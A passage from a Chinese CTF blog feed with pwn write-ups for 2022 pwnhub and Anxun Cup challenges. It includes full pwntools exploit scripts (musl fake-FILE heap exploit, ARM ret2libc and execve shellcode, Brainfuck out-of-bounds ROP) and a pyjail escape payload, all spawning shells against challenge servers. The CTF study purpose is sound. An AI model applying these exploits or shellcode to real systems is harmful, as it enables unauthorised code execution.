class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;47.97.127.1&#x27;</span>, <span class="hljs-number">23030</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(r,cmd)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment">#-------leak_heap-----------</span><br>show(<span class="hljs-number">16</span>)<br>heap_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0x180</span><br>info(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><span class="hljs-comment">#--------leak_pie--------</span><br>edit(<span class="hljs-number">16</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">16</span>)<br>ru(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>pie_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0x40c0</span><br>info(<span class="hljs-string">&quot;pie_base&quot;</span>,pie_base)<br><span class="hljs-comment">#-------------------------</span><br>meta_arena = p64(heap_base + <span class="hljs-number">0x180</span>) + p64(heap_base + <span class="hljs-number">0xb8</span>)<br>edit(<span class="hljs-number">16</span>,<span class="hljs-number">0x10</span>,meta_arena)<br>bss_ptr = pie_base + <span class="hljs-number">0x4040</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>,p64(bss_ptr))<br>edit(<span class="hljs-number">0x390</span>,<span class="hljs-number">0x10</span>,p64(bss_ptr)+p64(pie_base+elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br><span class="hljs-comment">#---------leak_libc-------</span><br>show(<span class="hljs-number">1</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span><br>stdout=libc_base+<span class="hljs-number">0x98320</span><br>edit(<span class="hljs-number">0x390</span>,<span class="hljs-number">0x10</span>,p64(bss_ptr)+p64(stdout))<br><span class="hljs-comment">#-------------------------</span><br>fake_IO = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> <span class="hljs-comment"># flags</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rpos</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rend</span><br>fake_IO += p64(libc_base + <span class="hljs-number">0x4bf0f</span>) <span class="hljs-comment"># close</span><br>fake_IO += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># wend</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># wpos</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># mustbezero_1</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># wbase</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># read</span><br>fake_IO += p64(system) <span class="hljs-comment"># write</span><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#b*__fwritex+42</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(fake_IO),fake_IO)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="坐井观天">坐井观天</h2><p>python沙箱逃逸(pyjail)，这类题没做过</p><blockquote><p>python沙箱逃逸（pyjail），是CTF中一类题的通称：在这些题目中，我们能够交互式地用<code>eval</code>或者<code>exec</code>执行python代码。然而，执行的代码和上下文均受到一定限制，如题目用正则表达式拒绝部分字符的输入、以及令<code>__builtins__=None</code>等</p></blockquote><p>本题没有文件，对特定的字符有限制（如空格、单双引号、[]）要绕过</p><p><code>eval(input())</code>执行我们接下来输入的命令</p><p>接着输入<code>__import__('os').system('sh')</code>来获得shell即可</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/4.png" alt="4"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>整数溢出</tag>
      
      <tag>musl</tag>
      
      <tag>数组越界</tag>
      
      <tag>pyjail</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022安洵杯pwn</title>
    <link href="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
    <url>/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="前言：">前言：</h2><p>也只是解了一题，后续复现下，<a href="https://www.kdocs.cn/l/cjhpps6s8YeO">官方wp</a></p><p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/1.png" alt="1"></p><h2 id="babyarm">babyarm</h2><p>一开始环境没装好，也没学过arm rop，整了三个小时还是解出来了，主要这题不难。</p><h3 id="分析：">分析：</h3><p>本题是32位arm架构</p><p>最先有个base64加密，检测通过后能栈溢出</p><p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/2.png" alt="2"></p><p>233其实就只是编码表0~9的位置变了一下</p><p>网上找了个python实现的程序解密一下得到<code>s1mpl3Dec0d4r</code></p><p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/3.png" alt="3"></p><h3 id="1-ret2libc">1.ret2libc</h3><p>arm架构的rop虽然不熟，但原理都是一样的，基本上看着这篇<a href="https://oneda1sy.gitee.io/2021/08/02/Arm32-easyRop/">文章</a>对照着来解的</p><p>无非就是ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-comment">#r=process([&quot;qemu-arm&quot;,&quot;-L&quot;,&quot;/usr/arm-linux-gnueabi/&quot;,&quot;./chall&quot;])</span><br>r=remote(<span class="hljs-string">&quot;47.108.29.107&quot;</span>,<span class="hljs-string">&quot;10387&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&quot;arm&quot;</span><br>elf = ELF(<span class="hljs-string">&quot;./chall&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br>sla(<span class="hljs-string">&quot;msg&gt; &quot;</span>,<span class="hljs-string">b&#x27;s1mpl3Dec0d4r&#x27;</span>)<br>puts_plt=<span class="hljs-number">0x104ac</span><br>puts_got=<span class="hljs-number">0x0002101C</span><br>pop_r3_pc=<span class="hljs-number">0x00010464</span> <span class="hljs-comment"># pop &#123;r3, pc&#125;</span><br>pop_r4_to_pc =<span class="hljs-number">0x00010cb0</span> <span class="hljs-comment"># pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span><br>mov_r0_r7_call=<span class="hljs-number">0x00010ca0</span> <span class="hljs-comment"># mov r0, r7 ; blx r3</span><br>call_r3=<span class="hljs-number">0x00010ca4</span> <span class="hljs-comment"># blx r3</span><br>pc=<span class="hljs-number">0x00010658</span> <span class="hljs-comment"># pop &#123;fp, pc&#125;</span><br>main=<span class="hljs-number">0x10c30</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x2c</span><span class="hljs-comment">#+b&#x27;b&#x27;*4</span><br>payload += p32(pop_r4_to_pc)<br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># R4</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># R5</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># R6</span><br>payload += p32(puts_got)   <span class="hljs-comment"># R7</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># R8</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># SB</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># SL</span><br>payload += p32(pop_r3_pc)<br>payload += p32(puts_plt)<br>payload += p32(mov_r0_r7_call)<br>payload += <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">28</span>  <span class="hljs-comment"># r4 - r10</span><br>payload += p32(main)<br><br><br>sea(<span class="hljs-string">&quot;comment&gt; &quot;</span>,payload)<br>libc_base=uu32(ru(<span class="hljs-string">&#x27;\xff&#x27;</span>)[-<span class="hljs-number">4</span>:])-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>sla(<span class="hljs-string">&quot;msg&gt; &quot;</span>,<span class="hljs-string">b&#x27;s1mpl3Dec0d4r&#x27;</span>)<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=libc_base+<span class="hljs-number">0x00131bec</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x2c</span><span class="hljs-comment">#+b&#x27;b&#x27;*4</span><br>payload += p32(pop_r4_to_pc)<br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># R4</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># R5</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># R6</span><br>payload += p32(binsh)   <span class="hljs-comment"># R7</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># R8</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># SB</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># SL</span><br>payload += p32(pop_r3_pc)<br>payload += p32(system)<br>payload += p32(mov_r0_r7_call)<br>sea(<span class="hljs-string">&quot;comment&gt; &quot;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="2-ret2shellcode">2.ret2shellcode</h3><p>看了别的师傅的题解，因为是qemu模拟而不是真机，所以nx，pie这些都无效，所以其实可以ret2shellcode，试了一下也确实可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>r=process([<span class="hljs-string">&quot;qemu-arm&quot;</span>,<span class="hljs-string">&quot;-L&quot;</span>,<span class="hljs-string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="hljs-string">&quot;./chall&quot;</span>])<br><span class="hljs-comment">#r=remote(&quot;47.108.29.107&quot;,&quot;10387&quot;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&quot;arm&quot;</span><br>elf = ELF(<span class="hljs-string">&quot;./chall&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br>sla(<span class="hljs-string">&quot;msg&gt; &quot;</span>,<span class="hljs-string">b&#x27;s1mpl3Dec0d4r&#x27;</span>)<br>read=<span class="hljs-number">0x10C00</span><br>sla(<span class="hljs-string">&quot;comment&gt;&quot;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p32(elf.bss()+<span class="hljs-number">0x2c</span>)+p32(read))<br>shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    add r0,pc,#12</span><br><span class="hljs-string">    mov r1,#0</span><br><span class="hljs-string">    mov r2,#0</span><br><span class="hljs-string">    mov r7,#11</span><br><span class="hljs-string">    svc 0</span><br><span class="hljs-string">    .ascii &quot;/bin/sh\\0&quot;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode=asm(shellcode)<br>se(shellcode.ljust(<span class="hljs-number">0x2c</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)+p32(elf.bss()))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="调试">调试</h3><p>启动时设置参数-g 8888 开启8888端口</p><p>如<code>qemu-arm -g 8888 -L /usr/arm-linux-gnueabi/ ./chall</code></p><p>接着用</p><p><code>gdb-multiarch</code></p><p>设置架构</p><p><code>set architecture arm</code></p><p>连接端口</p><p><code>target remote localhost:8888</code></p><h2 id="babybf">babybf</h2><p>赛后分析了下，发现是一道很有意思的题目</p><blockquote><p>Brainfuck是一种极小化的计算机语言，它是由Urban Müller在1993年创建的。由于fuck在英语中是脏话，这种语言有时被称为brainf*ck或brainf**k，甚至被简称为BF。</p></blockquote><p>其实本题是一个c语言实现的Brainfuck语言的解释器，就是让我们输入Brainfuck语言去pwn</p><h3 id="分析：-2">分析：</h3><p>当然我们一开始啥都不知道，ida打开程序，主要分析这里的数组</p><p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/6.png" alt="6"></p><p>这里把我们输入的code当作数组的下标进去转换</p><p>我们看这个数组是啥东西</p><p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/7.png" alt="7"></p><p>我们要转换到这些00~08的值的话就要送一些特定的字符</p><p>其实这里相当于对应选项v4[0~8],去执行一些命令</p><p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/8.png" alt="8"></p><p>我们计算一下地址可以得到对应的字符</p><blockquote><p>例：0：(0x2110-0x2020)/4=0x3c=“&lt;”</p></blockquote><p>总结可得:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0</span>:\x3c --&gt;<span class="hljs-string">&quot;&lt;&quot;</span><br><span class="hljs-number">1</span>:\x3e --&gt;<span class="hljs-string">&quot;&gt;&quot;</span><br><span class="hljs-number">2</span>:\x2b --&gt;<span class="hljs-string">&quot;+&quot;</span><br><span class="hljs-number">3</span>:\x2d --&gt;<span class="hljs-string">&quot;-&quot;</span><br><span class="hljs-number">4</span>:\x2e --&gt;<span class="hljs-string">&quot;.&quot;</span><br><span class="hljs-number">5</span>:\x2c --&gt;<span class="hljs-string">&quot;,&quot;</span><br><span class="hljs-number">6</span>:\x5b --&gt;<span class="hljs-string">&quot;[&quot;</span><br><span class="hljs-number">7</span>:\x5d --&gt;<span class="hljs-string">&quot;]&quot;</span><br><span class="hljs-number">8</span>:\x00<br></code></pre></td></tr></table></figure><p>这其实就是Brainfuck语言的字符标识</p><blockquote><p>Brainfuck程序可以用下面的替换方法翻译成C语言（这题ptr是在栈上）：</p><table><thead><tr><th style="text-align:left">Brainfuck</th><th>C</th></tr></thead><tbody><tr><td style="text-align:left">&gt;</td><td>++ptr;</td></tr><tr><td style="text-align:left">&lt;</td><td>–ptr;</td></tr><tr><td style="text-align:left">+</td><td>++*ptr;</td></tr><tr><td style="text-align:left">-</td><td>–*ptr;</td></tr><tr><td style="text-align:left">.</td><td>putchar(*ptr);</td></tr><tr><td style="text-align:left">,</td><td>*ptr =getch();</td></tr><tr><td style="text-align:left">[</td><td>while (*ptr) {</td></tr><tr><td style="text-align:left">]</td><td>}</td></tr></tbody></table></blockquote><h3 id="利用：">利用：</h3><p>这题漏洞在数组越界，没对下标做检查</p><p>我们通过调试可得初始位置ptr在<code>0x7fffe0c1eb60</code></p><p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/9.png" alt="9"></p><p>在栈上的固定偏移如下</p><p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/10.png" alt="10"></p><p>接下来就好做了，(偏移0x20)泄露libc，(偏移0x38)写rop到ret处执行system(“/bin/sh”)</p><h3 id="Exp">Exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./chall&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">content</span>):<br>    sla(<span class="hljs-string">&quot;len&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    sea(<span class="hljs-string">&quot;code&gt; &quot;</span>,content)<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-comment">#debug()</span><br>cmd(<span class="hljs-string">&quot;&gt;&quot;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&quot;.&gt;.&gt;.&gt;.&gt;.&gt;.&quot;</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:])-<span class="hljs-number">0x401B40</span><br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>pop_rdi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>)))<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=libc_base+libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>).<span class="hljs-built_in">next</span>()<br>ret = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;ret&#x27;</span>)))<br><br>payload=flat(ret,pop_rdi,binsh,system)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>cmd(<span class="hljs-string">&quot;&gt;&quot;</span>*<span class="hljs-number">0x38</span>+<span class="hljs-string">&quot;,&gt;&quot;</span>*(<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;,&#x27;</span>)<br>r.send(payload)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>arm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
